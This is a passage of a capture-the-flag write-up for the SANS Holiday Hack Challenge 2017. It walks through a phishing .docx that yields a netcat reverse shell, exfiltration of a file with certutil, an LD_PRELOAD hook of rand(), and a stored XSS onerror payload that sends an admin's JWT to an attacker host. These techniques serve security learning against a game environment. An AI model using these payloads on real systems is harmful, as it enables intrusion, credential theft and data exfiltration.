<p><strong>From:</strong> <a class="reference external" href="mailto:alabaster.snowball&#64;northpolechristmastown.com">alabaster.snowball&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> <a class="reference external" href="mailto:all&#64;northpolechristmastown.com">all&#64;northpolechristmastown.com</a></p>
<p><strong>Subject:</strong> Re: Lost book page</p>
<p>Well powershell is my new love but netcat will always hold a special
place in my heart.</p>
<p><strong>From:</strong> <a class="reference external" href="mailto:alabaster.snowball&#64;northpolechristmastown.com">alabaster.snowball&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> <a class="reference external" href="mailto:all&#64;northpolechristmastown.com">all&#64;northpolechristmastown.com</a></p>
<p><strong>Subject:</strong> Re: Lost book page</p>
<p>I installed nc.exe to path for my computer.</p>
</blockquote>
<p>Awesome, now we know that Alabaster has <code>nc.exe</code> in his PATH. We can use
this tool to connect back to our Internet-facing machine, to get a shell access
to the Elf-Machine Interface server.</p>
<p>Let's prepare our malicious .docx file, using the Sensepost tutorial:</p>
<img alt="ewa_malicious_docx.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_malicious_docx.png" />
<p>Now, let's send our gingerbread cookie recipe to our dear Alabaster, from Mrs
Claus's account. We can do this by putting her email address in our cookie, as
explained in the EWA section:</p>
<img alt="ewa_phishing_email.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_phishing_email.png" />
<p>And now, we wait for a shell:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> nc -knlvp <span class="m">8080</span>
<span class="go">listening on [any] 8080 ...</span>
<span class="go">connect to [X.X.X.X] from (UNKNOWN) [35.185.57.190] 52783</span>
<span class="go">Microsoft Windows [Version 10.0.14393]</span>
<span class="go">(c) 2016 Microsoft Corporation. All rights reserved.</span>

<span class="go">C:\Users\alabaster_snowball\Documents&gt;</span>
</pre></div>
<p>Sweet! We have a shell access to the EMI machine. Now, the only thing to do is
to get the <code>C:\GreatBookPage7.pdf</code> file. But how to exfiltrate?
Exfiltrating data from a Windows machine can be a pain, since there's no
useful tools like <code>scp</code>, <code>curl</code>, etc. (yet) to send data to the
outside.  One of my favourite tricks is to use the <code>certutil.exe</code> command
tool.  This tool is used to manipulate certificates, etc., but <a class="reference external" href="https://twitter.com/subtee/status/920425668084510721">it can be used
to base64-encode and -decode data</a>.</p>
<p>So, what we'll do is simply base64 encode the page to a file. Then we'll output
the content of the file, copy/paste it to our machine, and base64-decode it:</p>
<div class="highlight"><pre><span></span><span class="go">C:\Users\alabaster_snowball\Documents&gt; certutil.exe -f -encode C:\GreatBookPage7.pdf C:\Users\alabaster_snowball\Documents\GreatBookPage7.pdf.b64</span>
<span class="go">Input Length = 1053508</span>
<span class="go">Output Length = 1448634</span>
<span class="go">CertUtil: -encode command completed successfully.</span>

<span class="go">C:\Users\alabaster_snowball\Documents&gt; type .\GreatBookPage7.pdf.b64</span>
<span class="go">-----BEGIN CERTIFICATE-----</span>
<span class="go">JVBERi0xLjMKJcTl8uXrp/Og0MTGCjUgMCBvYmoKPDwgL0xlbmd0aCA2IDAgUiAv</span>
<span class="go">[snip]</span>
<span class="go">RU9GCg==</span>
<span class="go">-----END CERTIFICATE-----</span>
</pre></div>
<p>Then, on my machine (you must remove the <code>BEGIN CERTIFICATE</code> and
<code>END CERTIFICATE</code> from the output):</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> base64 -d .<span class="se">\G</span>reatBookPage7.pdf.b64 &gt; GreatBookPage7.pdf
</pre></div>
<p>Which gives us the <a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage7.pdf">seventh page of The Great Book</a>
(sha256: <code>bc93c535481abb76e3c5180406ea9ea0910acd53f76cab788f1d680d21b611b5</code>):</p>
<blockquote>
<p>Regarding the Witches of Oz</p>
<p>Of all the varied and amazing people who inhabit the Land of Oz, the
witches are among the most powerful, wielding potent magic and mesmerizing
spells. They travel through the air, propelled by bubbles or broomsticks.
Each witch has a very different attitude and outlook, ranging from faithful
friends who are dear to us all way down to hearts full of unwashed socks
and souls full of gunk.</p>
<p>During the Great Schism, the witches very deliberately remained neutral,
siding with neither the Munchkins nor the Elves. The witches seem to live
exclusively in Oz, tending to their castles. As of this writing, the
witches have never been observed in the North Pole.</p>
</blockquote>
</div>
</div>
<div class="section" id="who-is-behind-all-this">
<h2><a class="toc-backref" href="#id54">Who is behind all this?</a></h2>
<div class="section" id="north-pole-and-beyond-we-re-off-to-see-the">
<h3><a class="toc-backref" href="#id55">North Pole and Beyond: We're Off To See The...</a></h3>
<div class="section" id="id14">
<h4><a class="toc-backref" href="#id56">Cranberry Pi</a></h4>
<pre class="literal-block">
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</pre>
<p>Alright, we have a program, and we need to make it return 42:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ed587b205bb6:~$</span> ls -lh
<span class="go">total 100K</span>
<span class="go">-rwxr-xr-x 1 root root  83K Dec 16 16:56 isit42</span>
<span class="go">-rw-r--r-- 1 root root  654 Dec 16 16:56 isit42.c.un</span>
<span class="gp">elf@ed587b205bb6:~$</span> ./isit42
<span class="go">Starting up ... done.</span>
<span class="go">Calling rand() to select a random number.</span>
<span class="go">170 is not 42.</span>
</pre></div>
<p>Ok, the program seems to generate a random number, using <code>rand()</code>, and
compare the result to 42. If the random number is not equal to 42, the program
outputs an error. So, how can we force <code>rand</code> to return 42?</p>
<p>The common trick is to use <code>LD_PRELOAD</code>. If this shell variable holds
the path to a shared library, this library will be loaded before any other
library, include <code>libc</code>. The idea is to create our own library, with
our own version of <code>rand</code> that, for example, always return 42. Luckily
for us, a <a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">SANS blog post</a>
was recently posted on the subject.</p>
<p>The blog post focuses on the <code>usleep</code> instead of <code>rand</code>, but the
principle is the same. So, let's create our own <code>rand</code> library!</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ed587b205bb6:~$</span> cat <span class="s">&lt;&lt;EOF &gt; hijack_rand.c</span>
<span class="gp">&gt;</span><span class="s"> int rand()</span>
<span class="gp">&gt;</span><span class="s"> {</span>
<span class="gp">&gt;</span><span class="s">     return 42;</span>
<span class="gp">&gt;</span><span class="s"> }</span>
<span class="gp">&gt;</span><span class="s"></span>
<span class="gp">&gt;</span><span class="s"> EOF</span>
<span class="gp">elf@ed587b205bb6:~$</span> cat hijack_rand.c
<span class="go">int rand()</span>
<span class="go">{</span>
<span class="go">    return 42;</span>
<span class="go">}</span>
<span class="gp">elf@ed587b205bb6:~$</span> gcc -o hijack_rand.so -shared -fPIC ./hijack_rand.c
<span class="gp">elf@ed587b205bb6:~$</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&quot;./hijack_rand.so&quot;</span> ./isit42
<span class="go">Starting up ... done.</span>
<span class="go">Calling rand() to select a random number.</span>
<span class="go">                 .-.</span>
<span class="go">                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______</span>
<span class="go">               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |</span>
<span class="go">              /::::&#39;();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||</span>
<span class="go">            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_</span>
<span class="go">        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |</span>
<span class="go">         \,`////&quot;&quot;&quot;&quot;\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |</span>
<span class="go">         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|</span>
<span class="go">          \/|(_) () (_)|\/</span>
<span class="go">            \   &#39;()&#39;   /            ______    _______  _______  ___      ___      __   __    ___   _______</span>
<span class="go">            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |</span>
<span class="go">          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|</span>
<span class="go">         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____</span>
<span class="go">        /  |o`&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |</span>
<span class="go">       `.__/     ()     \__.&#39;      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |</span>
<span class="go">       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|</span>
<span class="go">       /  \|---|    |---|/  \</span>
<span class="go">       |  (|42 | () | DA|)  |       _   ___  _______</span>
<span class="go">       \  /;---&#39;    &#39;---;\  /      | | |   ||       |</span>
<span class="go">        `` \ ___ /\ ___ / ``       | |_|   ||____   |</span>
<span class="go">            `|  |  |  |`           |       | ____|  |</span>
<span class="go">      jgs    |  |  |  |            |___    || ______| ___</span>
<span class="go">       _._  |\|\/||\/|/|  _._          |   || |_____ |   |</span>
<span class="go">      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|</span>
<span class="go">      | \__.&#39;    ||    &#39;.__/ |</span>
<span class="go">       `---------&#39;&#39;---------`</span>
<span class="go">Congratulations! You&#39;ve won, and have successfully completed this challenge.</span>
</pre></div>
</div>
<div class="section" id="id15">
<h4><a class="toc-backref" href="#id57">Redirecting the snowball</a></h4>
<p>Here's the layout I used to solve this level (I know, I got suuuper lazy, but
God bless this portal):</p>
<img alt="we_re_off_to_see_the_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/we_re_off_to_see_the_snowball.gif" />
<p>Having completed this level, we have a little chat with a certain someone:</p>
<blockquote>
<p><strong>Glinda the Good Witch:</strong> It's me, Glinda the Good Witch of Oz! You found
me and ruined my genius plan!</p>
<p>You see, I cast a magic spell on the Abominable Snow Monster to make him
throw all the snowballs at the North Pole. Why? Because I knew a giant
snowball fight would stir up hostilities between the Elves and the
Munchkins, resulting in all-out WAR between Oz and the North Pole. I was
going to sell my magic and spells to both sides. War profiteering would
mean GREAT business for me.</p>
<p>But, alas, you and your sleuthing foiled my venture. And I would have
gotten away with it too, if it weren't for you meddling kids!</p>
</blockquote>
<p>My, oh my, what a nasty plan!</p>
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-elf-database">
<h3><a class="toc-backref" href="#id58">North Pole Christmas Town infrastructure: Elf Database</a></h3>
<p>On to the last application, the Elf Database. Given the name, we can expect the
application to be some sort of web interface allowing us to have access to the
list of North Pole's elves.</p>
<p>Once again, if we try to connect using Alabaster's account, we get an
<code>Incorrect username or password!</code> error.</p>
<img alt="edb_login_fail.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_login_fail.png" />
<p>So, let's see what we can find from basic recon. Once again, we get some
information by taking a look at the <code>robots.txt</code> file:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/robots.txt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=5A0K85HFazf2m0ltjg3g</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 07 Jan 2018 23:02:46 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/plain; charset=utf-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Tue, 15 Aug 2017 04:58:06 GMT</span>

User-agent: *
Disallow: /dev
</pre></div>
<p>So, there is a <code>/dev</code> directory. If we browse to it, we find only one
file, <code>LDIF_template.txt</code>:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/dev/LDIF_template.txt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=5A0K85HFazf2m0ltjg3g</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 07 Jan 2018 23:04:47 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/plain; charset=utf-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">751</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>

#LDAP LDIF TEMPLATE

dn: dc=com
dc: com
objectClass: dcObject

dn: dc=northpolechristmastown,dc=com
dc: northpolechristmastown
objectClass: dcObject
objectClass: organization

dn: ou=human,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: human

dn: ou=elf,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: elf

dn: ou=reindeer,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: reindeer

dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
objectClass: addressbookPerson
cn:
sn:
gn:
profilePath: /path/to/users/profile/image
uid:
ou:
department:
mail:
telephoneNumber:
street:
postOfficeBox:
postalCode:
postalAddress:
st:
l:
c:
facsimileTelephoneNumber:
description:
<span class="hll">userPassword:
</span></pre></div>
<p>This gives us some info about how the Elf Database application functions.
There's obviously an LDAP backend. We also have the list of attributes for the
object representing the users, including one which seems particularly juicy,
<code>userPassword</code>.</p>
<p>Learning that the application uses an LDAP backend, I tried to bypass
authentication using LDAP injection, but it did not work. So, let's take a look
at the source code of the application. Here's what we can find on the
<code>index.html</code> page:</p>
<div class="highlight"><pre><span></span>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="hll">            <span class="nx">token</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&quot;np-auth&quot;</span><span class="p">);</span>
</span>            <span class="k">if</span> <span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
<span class="hll">                <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span> <span class="s2">&quot;/login&quot;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">auth_token</span><span class="o">:</span> <span class="nx">token</span> <span class="p">}).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span> <span class="nx">result</span> <span class="p">)</span> <span class="p">{</span>
</span>                    <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">link</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">})</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
<p>Hmm, a token stored in the local storage, under the key <code>np-auth</code> seems
to be used for the application session management. Let's keep digging.</p>
<p>Under the login form, there's a support link, where you can send a password
reset request to an administrator. Since we have access to Alabaster's email
account, let's try and reset his password:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/service</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=6S6Nd58Sy85OK09ui063</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

uid=alabaster.snowball&amp;email=alabaster.snowball%40northpolechristmastown.com&amp;message=I+forgot+my+password!
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 07 Jan 2018 23:20:45 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">115</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&quot;bool&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&quot;link&quot;</span><span class="p">:</span><span class="s2">&quot;/reset_request?ticket=OYHAT-T8XZR-EC2YB-U0173&quot;</span><span class="p">,</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot;Request Submitted. Redirecting...&quot;</span><span class="p">}</span>
</pre></div>
<p>Now that our password reset request was sent, let's check Alabaster's email!
Hmm, nothing. Let's see what happened after our request was sent. We get
redirected to a support ticket page:</p>
<img alt="edb_request_normal.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_request_normal.png" />
<p>And our message is embedded in the page. Is it possible that they forgot to
sanitize our user input? Let's try to inject some special characters:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/service</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com/index.html</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=53LByIBB8Ct5Z79RdsTC</span>

uid=alabaster.snowball&amp;email=alabaster.snowball%40northpolechristmastown.com&amp;message=&lt;u&gt;Pretty+underlined+message&lt;/u&gt;
</pre></div>
<p>Now, if we take a look at our ticket page, we can see that the <code>&lt;u&gt;</code> tag
was rendered, and my message appears underlined:</p>
<img alt="edb_request_underlined.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_request_underlined.png" />
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>Alabaster<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>Snowball<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>alabaster.snowball@northpolechristmastown.com<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>123-456-7890<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
<span class="hll">    <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">u</span><span class="p">&gt;</span>Pretty underlined message<span class="p">&lt;/</span><span class="nt">u</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span><span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
</pre></div>
<p>This means that we can try to perform an XSS attack against the administrator
that will visualize our request! I usually use tags like <code>&lt;u&gt;</code> or
<code>&lt;b&gt;</code> when testing for XSS, because they're usually not picked up by
WAFs or by custom implemented filters. And indeed, if we take a look at the
<code>custom.js</code> file, we can see that there's some filtering done on the
client side to trigger on text like <code>script</code>.</p>
<div class="highlight"><pre><span></span><span class="c1">// --------------------------Customer Service Request -----------------------------/</span>
<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#help_button&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
    <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">help_uid</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#help_uid&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">help_email</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#help_email&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">help_message</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#help_message&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">help_uid</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^\w+\.\w+$/g</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">help_email</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?$/g</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">help_message</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^.+$/g</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
<span class="hll">                <span class="k">if</span> <span class="p">(</span><span class="nx">help_message</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/[sS][cC][rR][iI][pP][tT]/g</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></pre></div>
<p>Now, client-side verifications can be bypassed easily by performing the HTTP
request directly. But in that case, the check (among others) was also performed
on the server-side.</p>
<p>So, let's use another type of XSS payload, that does not involve the word
<code>script</code>. One of the most common is to use the <code>onerror</code> attribute.
Let's try and see:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/service</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com/index.html</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=53LByIBB8Ct5Z79RdsTC</span>

uid=alabaster.snowball&amp;email=alabaster.snowball%40northpolechristmastown.com&amp;message=&lt;img src=x onerror=&quot;alert(&#39;Huh oh, Spaghettios&#39;)&quot; /&gt;
</pre></div>
<img alt="edb_request_xss.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_request_xss.png" />
<p>Bingo, it works! Now, let's create a payload that will capture the
<code>np-auth</code> entry from the local storage. The application uses jQuery,
which means that we can use <code>$.get</code> to easily exfiltrate our token to our
public-facing website:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/service</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com/index.html</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=53LByIBB8Ct5Z79RdsTC</span>

uid=alabaster.snowball&amp;email=alabaster.snowball%40northpolechristmastown.com&amp;message=&lt;img src=x onerror=&quot;$.get(%26quot;http://X.X.X.X/?%26quot;%2blocalStorage.getItem(%26quot;np-auth%26quot;),function(a,b){})&quot; /&gt;
</pre></div>
<p>And in a <code>nc</code> on our server, we wait for our payload to get triggered:</p>
<div class="highlight"><pre><span></span><span class="gp">#</span> nc -nvk -l -p <span class="m">80</span>
<span class="go">listening on [any] 80 ...</span>
<span class="go">connect to [X.X.X.X] from (UNKNOWN) [Y.Y.Y.Y] 50132</span>
<span class="hll"><span class="go">GET /?eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.0</span>
</span><span class="go">Host: X.X.X.X</span>
<span class="go">Connection: close</span>
<span class="go">Accept: */*</span>
<span class="go">Referer: http://127.0.0.1/reset_request?ticket=DFYCN-8UI5I-AD87J-BRR9P</span>
<span class="go">Origin: http://127.0.0.1</span>
<span class="go">User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</span>
<span class="go">Accept-Encoding: gzip, deflate</span>
<span class="go">Accept-Language: en-US,*</span>
</pre></div>
<p>Hurray, we got our token! Let's put it in our local storage, then head to the
<code>index.html</code> page, and... nothing. Well that's disappointing. Let's take
a look at our token. It seems to be three base64-encoded pieces of data,
separated by full stops. This seems to indicate that this is a <a class="reference external" href="https://auth0.com/learn/json-web-tokens/">JSON Web Token
(JWT)</a>. The first part is the
header, <code>{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</code>, the second part is the payload,
<code>{&quot;dept&quot;:&quot;Engineering&quot;,&quot;ou&quot;:&quot;elf&quot;,&quot;expires&quot;:&quot;2017-08-16 12:00:47.248093+00:00&quot;,&quot;uid&quot;:&quot;alabaster.snowball&quot;}</code>,
and the third part is the signature.</p>
<p>Our newfound token didn't work because it seems that it expired in August 2017.
We could modify the expiry date to put it in the future, but we can't compute
a new signature for our modified payload, because we don't know what secret
key is used. I tried using the trick of the <code>none</code> algorithm (<a class="reference external" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">described
here</a>),
which has worked for coworkers of mine in the past. But it didn't work in that
case.</p>
<p>What's left to us is to try and bruteforce the secret key, so that we can
